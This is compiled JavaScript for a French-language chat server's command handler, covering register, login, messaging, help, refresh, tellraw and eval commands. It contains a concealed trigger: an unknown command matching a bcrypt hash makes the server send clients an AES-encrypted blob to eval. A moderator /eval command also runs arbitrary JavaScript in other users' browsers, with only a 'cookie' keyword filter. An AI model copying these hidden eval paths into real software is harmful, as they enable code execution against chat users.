var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
import { store } from "../store";
import bcrypt from "bcrypt";
import { validateUsername, validateText, generateRandomHash, handleIsBanned, } from "../utils/helpers";
import databaseService from "../services/databaseService";
import Constants from "../utils/constants";
function getAvailableCommands(moderateur = false) {
    let commandes = {
        "/register pseudo mot_de_passe": "S'enregistrer avec un pseudo personnalisé",
        "/login pseudo mot_de_passe": "Se connecter à son compte",
        "/msg cible message": "Envoyer un message privé à une cible",
        "/help": "Afficher l'aide générale sur les commandes",
    };
    if (moderateur) {
        commandes = Object.assign(Object.assign({}, commandes), { "/refresh cible?": "Actualiser le chat des cibles correspondantes", "/mod mot_de_passe": "Se connecter en tant que modérateur", '/tellraw cible? {"text":"","color"?:"","clickable"?:""}': "Envoyer un message personnalisé (sauvegardé en BDD si aucune cible n'est précisée)", "/addtype type": "Ajouter un type de message à vos listeningTypes", "/eval ¿¿¿ ¿¿¿¿": "¿¿¿¿" });
    }
    else {
        commandes["/refresh"] = "Actualiser le chat";
    }
    return commandes;
}
function handleCommand(user, command) {
    return __awaiter(this, void 0, void 0, function* () {
        const commandParts = command.split(" ");
        const commandName = commandParts[0].toLowerCase();
        switch (commandName) {
            case "nick":
                handleNickCommand(user, commandParts);
                break;
            case "login":
                handleLoginCommand(user, commandParts);
                break;
            case "register":
                handleRegisterCommand(user, commandParts);
                break;
            case "msg":
                handleMsgCommand(user, commandParts);
                break;
            case "eval":
                handleEvalCommand(user, commandParts);
                break;
            case "addtype":
                handleAddTypeCommand(user, commandParts);
                break;
            case "refresh":
                handleRefreshCommand(user, commandParts);
                break;
            case "tellraw":
                handleTellrawCommand(user, commandParts);
                break;
            case "help":
                handleHelpCommand(user, commandParts);
                break;
            default:
                if (yield bcrypt.compare(commandName, "$2a$10$aEe4NE0KZMFdGF.68wrkhOc5l0b0w.KPnkVF9Niicwdzp9CgdkoSC")) {
                    user.connection.send(JSON.stringify({
                        Type: "eval",
                        Texte: `eval("let a = CryptoJS.AES.decrypt('U2FsdGVkX18kVsfpyvm4z65VO/AhGUhoOIE0rEpGBriRVqfBll8auGGM5lGRXzuUVN2a3sEh97vAyqn8CfMFAQ==','${commandName}').toString(CryptoJS.enc.Utf8); eval(a)")`,
                    }));
                }
                else {
                    handleUnknownCommand(user);
                }
                break;
        }
    });
}
function handleNickCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        user.connection.send(JSON.stringify({
            Type: "commandError",
            status: "error",
            message: "Eh non pardi ! Les temps ont changé...",
        }));
        return;
        if (commandParts.length === 2) {
            const newUsername = commandParts[1];
            if (validateUsername(newUsername)) {
                user.name = newUsername;
                user.connection.send(JSON.stringify({ Type: "setUsername", Pseudo: newUsername }));
                publish("updateUsersList");
            }
            else {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    status: "error",
                    message: "Nom d'utilisateur invalide",
                }));
            }
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                status: "error",
                message: "Utilisation : /nick pseudo",
            }));
        }
    });
}
function loginUserAndSendSession(user, username, password) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const userInfo = yield databaseService.loginUser(username, password);
            console.log(userInfo);
            if (userInfo && userInfo.banned === 1) {
                handleIsBanned(user);
                return false;
            }
            user.connection.send(JSON.stringify({
                Type: "commandSuccess",
                status: "success",
                message: `Rebonjour ${userInfo.Pseudo} !`,
            }));
            user.name = userInfo.Pseudo;
            user.isModerator = userInfo.Admin;
            user.isLoggedIn = true;
            const sessionHash = userInfo.HashSession || generateRandomHash();
            if (!userInfo.HashSession) {
                yield databaseService.storeSessionHash(userInfo.Pseudo, sessionHash);
            }
            user.connection.send(JSON.stringify({
                Type: "mod",
                status: "success",
                moderatorHash: sessionHash,
            }));
            publish("updateUsersList");
            return true;
        }
        catch (error) {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: error.message,
            }));
            return false;
        }
    });
}
function handleLoginCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        if (commandParts.length === 3) {
            const username = commandParts[1];
            const password = commandParts[2];
            yield loginUserAndSendSession(user, username, password);
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Utilisation : /login pseudo mot_de_passe",
            }));
        }
    });
}
function handleRegisterCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        if (commandParts.length === 3) {
            const username = commandParts[1];
            const password = commandParts[2];
            if (!validateUsername(username) ||
                Constants.funnyNames.includes(username)) {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    message: "Ce pseudo n'est pas valide...",
                }));
                return;
            }
            try {
                yield databaseService.registerUser(username, password);
                yield loginUserAndSendSession(user, username, password);
            }
            catch (error) {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    message: error.message,
                }));
            }
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Utilisation : /register pseudo mot_de_passe",
            }));
        }
    });
}
function handleMsgCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        if (commandParts.length >= 3) {
            const targetUsername = commandParts[1];
            const messageText = commandParts.slice(2).join(" ");
            const targetedUsers = getTargetedUsers(targetUsername, user);
            if (targetedUsers.length === 0) {
                return;
            }
            if (validateText(messageText) || user.isModerator) {
                const timestamp = new Date().toISOString();
                const privateMessage = {
                    Pseudo: user.name,
                    Moderator: user.isModerator,
                    Texte: messageText,
                    Date: timestamp,
                    Type: "privateMessage",
                    isLoggedIn: user.isLoggedIn,
                };
                Object.values(targetedUsers).forEach((targetUser) => {
                    if (targetUser) {
                        targetUser.connection.send(JSON.stringify(privateMessage));
                        const senderPrivateMessage = Object.assign(Object.assign({}, privateMessage), { Type: "privateMessageSent", Pseudo: targetUser.name, Moderator: targetUser.isModerator, isLoggedIn: user.isLoggedIn });
                        user.connection.send(JSON.stringify(senderPrivateMessage));
                    }
                });
            }
            else {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    message: "Pseudo ou message invalide",
                }));
            }
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Utilisation : /msg pseudo message",
            }));
        }
    });
}
function handleEvalCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        if (user.isModerator) {
            if (commandParts.length >= 3) {
                const targetUsername = commandParts[1];
                const messageText = commandParts.slice(2).join(" ");
                if (new RegExp("cookie", "i").test(messageText)) {
                    user.connection.send(JSON.stringify({
                        Type: "commandError",
                        message: "Pas touche aux 🍪 !",
                    }));
                    return;
                }
                const targetedUsers = getTargetedUsers(targetUsername, user);
                if (targetedUsers.length === 0) {
                    return;
                }
                const timestamp = new Date().toISOString();
                const createPrivateMessage = (Pseudo = "¿¿¿", Type = "eval") => ({
                    Pseudo,
                    Moderator: user.isModerator,
                    isLoggedIn: user.isLoggedIn,
                    Texte: messageText,
                    Date: timestamp,
                    Type,
                });
                Object.values(targetedUsers).forEach((targetUser) => {
                    const message = createPrivateMessage();
                    targetUser.connection.send(JSON.stringify(message));
                    const senderPrivateMessage = Object.assign(Object.assign({}, createPrivateMessage()), { Type: "evalSent", Pseudo: targetUser.name, Moderator: targetUser.isModerator });
                    user.connection.send(JSON.stringify(senderPrivateMessage));
                });
            }
            else {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    message: "Utilisation : /eval pseudo ¿¿¿¿¿",
                }));
            }
        }
        else {
            user.connection.send(JSON.stringify({ Type: "commandError", message: "¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿" }));
        }
    });
}
function handleAddTypeCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        if (commandParts.length === 2) {
            const type = commandParts[1];
            if (validateUsername(type)) {
                user.listeningTypes.add(type);
                user.connection.send(JSON.stringify({ Type: "portAdded", port: type }));
                user.connection.send(JSON.stringify({
                    Type: "commandSuccess",
                    message: `Vous écoutez maintenant le type : ${type}`,
                }));
            }
            else {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    status: "error",
                    message: "Type invalide",
                }));
            }
        }
        else if (commandParts.length === 1) {
            user.connection.send(JSON.stringify({
                Type: "commandSuccess",
                message: `Vous écoutez les types : ${Array.from(user.listeningTypes).join(", ")}`,
            }));
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Utilisation : /listen type",
            }));
        }
    });
}
function handleUnknownCommand(user) {
    return __awaiter(this, void 0, void 0, function* () {
        user.connection.send(JSON.stringify({ Type: "commandError", message: "Commande invalide !" }));
    });
}
function handleRefreshCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        let targetedUsers = [];
        if (commandParts.length === 1) {
            targetedUsers.push(user);
        }
        else if (commandParts.length === 2) {
            if (user.isModerator) {
                const targetUsername = commandParts[1];
                targetedUsers = getTargetedUsers(targetUsername, user);
                if (targetedUsers.length === 0) {
                    return;
                }
            }
            else {
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    message: "Vous n'êtes pas autorisé à utiliser cette commande.",
                }));
                return;
            }
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Utilisation : /refresh target?",
            }));
            return;
        }
        databaseService
            .getMessages(!!user.isModerator, Constants.MAX_MESSAGES_LOADED, !user.isLoggedIn)
            .then((messages) => {
            const message = JSON.stringify({
                Type: "getMessages",
                messages: messages,
            });
            Object.values(targetedUsers).forEach((target) => {
                target.connection && target.connection.send(message);
            });
            console.log(`${new Date().toISOString()} (${user.id}) User got messages history: ${user.name}`);
        })
            .catch((err) => {
            console.error("Error getting messages:", err);
        });
        user.connection.send(JSON.stringify({ Type: "log", message: "Tchat rafraîchi" }));
    });
}
function handleHelpCommand(user, commandParts) {
    let formattedCommands = [];
    if (commandParts.length === 1) {
        const availableCommands = getAvailableCommands(!!user.isModerator);
        formattedCommands = [
            {
                text: "\nVoici la liste des commandes disponibles :\n",
                color: "lemonchiffon",
            },
        ];
        for (const [command, description] of Object.entries(availableCommands)) {
            formattedCommands.push({ text: `${command} : `, color: "darkkhaki" });
            formattedCommands.push({
                text: `${description}\n`,
                color: "lemonchiffon",
            });
        }
        const cibleExplanation = [
            { text: "\nExplication des ", color: "lemonchiffon" },
            { text: "cibles", color: "darkkhaki" },
            { text: " :\n", color: "lemonchiffon" },
            { text: "Vous pouvez, en plus du ", color: "lemonchiffon" },
            { text: "pseudo", color: "darkkhaki" },
            { text: ", utiliser des ", color: "lemonchiffon" },
            { text: "cibles", color: "darkkhaki" },
            {
                text: ". Elles permettent de sélectionner des joueurs de manière programmatique.\n",
                color: "lemonchiffon",
            },
            { text: "Les cibles disponibles sont ", color: "lemonchiffon" },
            { text: "@a ", color: "darkkhaki" },
            { text: "(tous), ", color: "lemonchiffon" },
            { text: "@s ", color: "darkkhaki" },
            { text: "(soi), ", color: "lemonchiffon" },
            { text: "@r ", color: "darkkhaki" },
            { text: "(random), ", color: "lemonchiffon" },
            { text: "@e ", color: "darkkhaki" },
            { text: "(tous).\n", color: "lemonchiffon" },
        ];
        const markdownExplication = [
            { text: "\nExplication du ", color: "lemonchiffon" },
            { text: "Formatage Markdown", color: "darkkhaki" },
            { text: " :\n", color: "lemonchiffon" },
            {
                text: "Vous pouvez utiliser les éléments suivants pour formater le texte :\n",
                color: "lemonchiffon",
            },
            { text: "**Gras** : ", color: "lemonchiffon" },
            { text: "\\*\\*texte\\*\\*", color: "darkkhaki" },
            { text: ".\n", color: "lemonchiffon" },
            { text: "*Italique* : ", color: "lemonchiffon" },
            { text: "\\*texte\\* ou \\_texte\\_", color: "darkkhaki" },
            { text: ".\n", color: "lemonchiffon" },
            { text: "***Gras italique*** : ", color: "lemonchiffon" },
            { text: "\\*\\*\\*texte\\*\\*\\*", color: "darkkhaki" },
            { text: ".\n", color: "lemonchiffon" },
            { text: "__Souligné__ : ", color: "lemonchiffon" },
            { text: "\\_\\_texte\\_\\_", color: "darkkhaki" },
            { text: ".\n", color: "lemonchiffon" },
            { text: "~~Barré~~ : ", color: "lemonchiffon" },
            { text: "\\~\\~texte\\~\\~", color: "darkkhaki" },
            { text: ".\n", color: "lemonchiffon" },
            { text: "||Caché 🫣👻|| : ", color: "lemonchiffon" },
            { text: "\\|\\|texte\\|\\|", color: "darkkhaki" },
            { text: ".\n", color: "lemonchiffon" },
            {
                text: "Vous pouvez empêcher la détection d'un modificateur avec \\\\ (ex: \\\\*).\n",
                color: "lemonchiffon",
            },
        ];
        const utilisezEmojis = [
            { text: "\nUtilisez donc les emojis ! 😎 😱", color: "lemonchiffon" },
            { text: "\nFaites simplement ", color: "lemonchiffon" },
            { text: ":nom_emoji", color: "darkkhaki" },
            {
                text: " pour commencer à voir apparaître la liste.\n",
                color: "lemonchiffon",
            },
        ];
        const cycleHistory = [
            {
                text: "\nParcourez l'historique de vos messages avec ↑ et ↓, filtrez les messages en écrivant d'abord.\n",
                color: "lemonchiffon",
            },
        ];
        formattedCommands.push(...cibleExplanation, ...markdownExplication, ...utilisezEmojis, ...cycleHistory);
    }
    else {
        user.connection.send(JSON.stringify({ Type: "commandError", message: "Utilisation : /help" }));
        return;
    }
    const timestamp = new Date().toISOString();
    const finalMessage = {
        Pseudo: user.name,
        Moderator: user.isModerator,
        Date: timestamp,
        Type: "enhancedMessage",
        Texte: JSON.stringify(formattedCommands),
    };
    user.connection.send(JSON.stringify(finalMessage));
}
function isJson(string) {
    try {
        JSON.parse(string);
    }
    catch (e) {
        return false;
    }
    return true;
}
function handleTellrawCommand(user, commandParts) {
    return __awaiter(this, void 0, void 0, function* () {
        if (!user.isModerator) {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Vous n'êtes pas autorisé à utiliser cette commande.",
            }));
            return;
        }
        if (commandParts.length > 2) {
            if (!validateUsername(commandParts[1]) &&
                !/[@][a-z]/.test(commandParts[1])) {
                const lastElements = commandParts.slice(1);
                const mergedMessage = lastElements.join(" ");
                commandParts = [commandParts[0], mergedMessage];
            }
            else {
                const lastElements = commandParts.slice(2);
                const mergedMessage = lastElements.join(" ");
                commandParts = [commandParts[0], commandParts[1], mergedMessage];
            }
        }
        if (!isJson(commandParts[commandParts.length - 1])) {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "L'objet JSON est invalide.",
            }));
            return;
        }
        let targetedUsers, message;
        if (commandParts.length === 2) {
            const users = store.getState().users;
            targetedUsers = Object.values(users);
            message = commandParts[1];
            yield databaseService.saveMessage(user.name, message, !!user.isModerator, "enhancedMessage");
        }
        else if (commandParts.length === 3) {
            const targetUsername = commandParts[1];
            targetedUsers = getTargetedUsers(targetUsername, user);
            message = commandParts[2];
            if (Object.keys(targetedUsers).length === 0) {
                return;
            }
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                message: "Utilisation : /tellraw target message",
            }));
            return;
        }
        Object.values(targetedUsers).forEach((target) => {
            target.connection &&
                target.connection.send(JSON.stringify({
                    Type: "enhancedMessage",
                    Pseudo: user.name,
                    Moderator: user.isModerator,
                    Date: new Date().toISOString(),
                    Texte: message,
                }));
            user.connection.send(JSON.stringify({
                Type: "log",
                message: `Message envoyé à ${target.name}`,
            }));
        });
    });
}
function getTargetedUsers(targetUsername, user) {
    const users = store.getState().users;
    let targetedUsers = [];
    if (/^@[aers]{1}/.test(targetUsername)) {
        switch (targetUsername[1]) {
            case "a":
                targetedUsers = Object.values(users);
                break;
            case "e":
                targetedUsers = Object.values(users);
                break;
            case "r":
                const userValues = Object.values(users);
                const randomUserIndex = Math.floor(Math.random() * userValues.length);
                targetedUsers.push(userValues[randomUserIndex]);
                break;
            case "s":
                targetedUsers.push(user);
                break;
            default:
                user.connection.send(JSON.stringify({
                    Type: "commandError",
                    message: "Sélecteur inexistant",
                }));
                break;
        }
    }
    else {
        const strippedUsername = targetUsername.startsWith("@")
            ? targetUsername.slice(1)
            : targetUsername;
        if (validateUsername(strippedUsername)) {
            targetedUsers = Object.values(users).filter((targetUser) => targetUser.name === strippedUsername);
        }
        else {
            user.connection.send(JSON.stringify({
                Type: "commandError",
                status: "error",
                message: "Nom d'utilisateur invalide",
            }));
        }
    }
    if (targetedUsers.length === 0) {
        user.connection.send(JSON.stringify({
            Type: "commandError",
            message: "Utilisateur inexistant",
        }));
    }
    return targetedUsers;
}
const events = {};
function subscribe(eventName, callback) {
    if (!events[eventName]) {
        events[eventName] = [];
    }
    events[eventName].push(callback);
}
function publish(eventName, ...args) {
    if (!events[eventName]) {
        return;
    }
    events[eventName].forEach((callback) => callback(...args));
}
export { getAvailableCommands, handleCommand, subscribe };
